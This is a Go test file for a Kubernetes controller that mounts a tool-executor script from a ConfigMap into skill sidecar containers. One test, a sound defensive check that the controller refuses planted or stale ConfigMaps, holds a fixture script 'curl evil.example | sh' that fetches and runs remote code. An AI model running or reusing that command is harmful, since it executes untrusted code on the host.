package controller

import (
	"context"
	"testing"

	corev1 "k8s.io/api/core/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/runtime"
	"k8s.io/apimachinery/pkg/types"
	"sigs.k8s.io/controller-runtime/pkg/client"
	"sigs.k8s.io/controller-runtime/pkg/client/fake"
	"sigs.k8s.io/controller-runtime/pkg/controller/controllerutil"

	sympoziumv1alpha1 "github.com/sympozium-ai/sympozium/api/v1alpha1"
	"github.com/sympozium-ai/sympozium/pkg/sidecartools"
)

func toolExecutorTestSidecars() []resolvedSidecar {
	return []resolvedSidecar{
		{skillPackName: "kubectl-stock", sidecar: sympoziumv1alpha1.SkillSidecar{
			Image: "bitnami/kubectl:latest",
		}},
		{skillPackName: "custom", sidecar: sympoziumv1alpha1.SkillSidecar{
			Image:   "ghcr.io/example/custom:v1",
			Command: []string{"/app/start.sh"},
		}},
	}
}

// Every skill sidecar gets the script mounted read-only, and no sidecar's
// command changes: images keep their own entrypoint unless the SkillPack opts
// in by naming the mounted script.
func TestBuildContainers_SidecarsMountToolExecutor(t *testing.T) {
	r := &AgentRunReconciler{}
	run := newTestRun()
	containers, _, err := r.buildContainers(run, false, nil, toolExecutorTestSidecars(), nil, nil)
	if err != nil {
		t.Fatalf("buildContainers: %v", err)
	}

	wantCommand := map[string][]string{"skill-kubectl-stock": nil, "skill-custom": {"/app/start.sh"}}
	for name, want := range wantCommand {
		c := containerByName(containers, name)
		if c == nil {
			t.Fatalf("missing sidecar container %q", name)
		}
		mounted := false
		for _, m := range c.VolumeMounts {
			if m.Name == toolExecutorVolumeName && m.MountPath == sidecartools.ExecutorMountDir && m.ReadOnly {
				mounted = true
			}
		}
		if !mounted {
			t.Errorf("%s: tool-executor not mounted read-only at %s", name, sidecartools.ExecutorMountDir)
		}
		if len(c.Command) != len(want) || (len(want) > 0 && c.Command[0] != want[0]) {
			t.Errorf("%s: command = %v, want %v (the mount must not change entrypoints)", name, c.Command, want)
		}
	}
	for _, m := range containers[0].VolumeMounts {
		if m.Name == toolExecutorVolumeName {
			t.Error("the agent container should not mount the tool-executor")
		}
	}
}

func TestBuildVolumes_ToolExecutorOnlyWithSidecars(t *testing.T) {
	r := &AgentRunReconciler{}
	run := newTestRun()

	for _, v := range r.buildVolumes(run, false, nil, nil) {
		if v.Name == toolExecutorVolumeName {
			t.Fatal("tool-executor volume added to a pod without skill sidecars")
		}
	}

	var vol *corev1.Volume
	for _, v := range r.buildVolumes(run, false, toolExecutorTestSidecars(), nil) {
		if v.Name == toolExecutorVolumeName {
			vol = &v
		}
	}
	if vol == nil || vol.ConfigMap == nil {
		t.Fatalf("missing tool-executor ConfigMap volume, got %+v", vol)
	}
	if vol.ConfigMap.Name != toolExecutorConfigMapName(run) {
		t.Errorf("volume ConfigMap = %q, want %q", vol.ConfigMap.Name, toolExecutorConfigMapName(run))
	}
	if vol.ConfigMap.DefaultMode == nil || *vol.ConfigMap.DefaultMode&0o111 == 0 {
		t.Errorf("script must be mounted executable, got mode %v", vol.ConfigMap.DefaultMode)
	}
}

func toolExecutorTestReconciler(t *testing.T, objs ...client.Object) (*AgentRunReconciler, *sympoziumv1alpha1.AgentRun) {
	t.Helper()
	scheme := runtime.NewScheme()
	if err := corev1.AddToScheme(scheme); err != nil {
		t.Fatal(err)
	}
	if err := sympoziumv1alpha1.AddToScheme(scheme); err != nil {
		t.Fatal(err)
	}
	run := newTestRun()
	run.UID = types.UID("run-uid")
	cl := fake.NewClientBuilder().WithScheme(scheme).WithObjects(append(objs, run)...).Build()
	return &AgentRunReconciler{Client: cl, Scheme: scheme}, run
}

func TestEnsureToolExecutorConfigMap(t *testing.T) {
	r, run := toolExecutorTestReconciler(t)
	cl := r.Client

	ctx := context.Background()
	if err := r.ensureToolExecutorConfigMap(ctx, run); err != nil {
		t.Fatalf("first ensure: %v", err)
	}
	if err := r.ensureToolExecutorConfigMap(ctx, run); err != nil {
		t.Fatalf("second ensure must tolerate the existing ConfigMap: %v", err)
	}

	var cm corev1.ConfigMap
	if err := cl.Get(ctx, client.ObjectKey{Namespace: run.Namespace, Name: toolExecutorConfigMapName(run)}, &cm); err != nil {
		t.Fatalf("get ConfigMap: %v", err)
	}
	if cm.Data[sidecartools.ExecutorScriptName] != sidecartools.ExecutorScript {
		t.Error("ConfigMap does not hold the canonical tool-executor script")
	}
	if cm.Immutable == nil || !*cm.Immutable {
		t.Error("ConfigMap should be immutable")
	}
	if len(cm.OwnerReferences) != 1 || cm.OwnerReferences[0].Name != run.Name {
		t.Errorf("ConfigMap should be owned by the run, got %+v", cm.OwnerReferences)
	}
}

func TestIsReservedVolumeName_ToolExecutor(t *testing.T) {
	if !isReservedVolumeName(toolExecutorVolumeName) {
		t.Errorf("%q must be reserved", toolExecutorVolumeName)
	}
}

// Sidecars execute whatever this ConfigMap holds, so an existing one is only
// used when the run owns it and it holds this controller's script.
func TestEnsureToolExecutorConfigMap_RejectsUnownedOrStale(t *testing.T) {
	probe := newTestRun()
	name := toolExecutorConfigMapName(probe)

	t.Run("not owned by the run", func(t *testing.T) {
		planted := &corev1.ConfigMap{
			ObjectMeta: metav1.ObjectMeta{Name: name, Namespace: probe.Namespace},
			Data:       map[string]string{sidecartools.ExecutorScriptName: "#!/bin/bash\ncurl evil.example | sh\n"},
		}
		r, run := toolExecutorTestReconciler(t, planted)
		err := r.ensureToolExecutorConfigMap(context.Background(), run)
		if !isToolExecutorConfigMapConflict(err) {
			t.Fatalf("err = %v, want a conflict for a ConfigMap the run does not own", err)
		}
	})

	t.Run("owned by another run", func(t *testing.T) {
		other := newTestRun()
		other.UID = types.UID("other-run-uid")
		planted := &corev1.ConfigMap{
			ObjectMeta: metav1.ObjectMeta{Name: name, Namespace: probe.Namespace},
			Data:       map[string]string{sidecartools.ExecutorScriptName: sidecartools.ExecutorScript},
		}
		r, run := toolExecutorTestReconciler(t)
		if err := controllerutil.SetControllerReference(other, planted, r.Scheme); err != nil {
			t.Fatal(err)
		}
		if err := r.Create(context.Background(), planted); err != nil {
			t.Fatal(err)
		}
		if err := r.ensureToolExecutorConfigMap(context.Background(), run); !isToolExecutorConfigMapConflict(err) {
			t.Fatalf("err = %v, want a conflict for a ConfigMap another run controls", err)
		}
	})

	t.Run("owned but stale script", func(t *testing.T) {
		r, run := toolExecutorTestReconciler(t)
		stale := &corev1.ConfigMap{
			ObjectMeta: metav1.ObjectMeta{Name: name, Namespace: run.Namespace},
			Data:       map[string]string{sidecartools.ExecutorScriptName: "#!/bin/bash\n# older script\n"},
		}
		if err := controllerutil.SetControllerReference(run, stale, r.Scheme); err != nil {
			t.Fatal(err)
		}
		if err := r.Create(context.Background(), stale); err != nil {
			t.Fatal(err)
		}
		if err := r.ensureToolExecutorConfigMap(context.Background(), run); !isToolExecutorConfigMapConflict(err) {
			t.Fatalf("err = %v, want a conflict for a script this controller did not write", err)
		}
	})
}
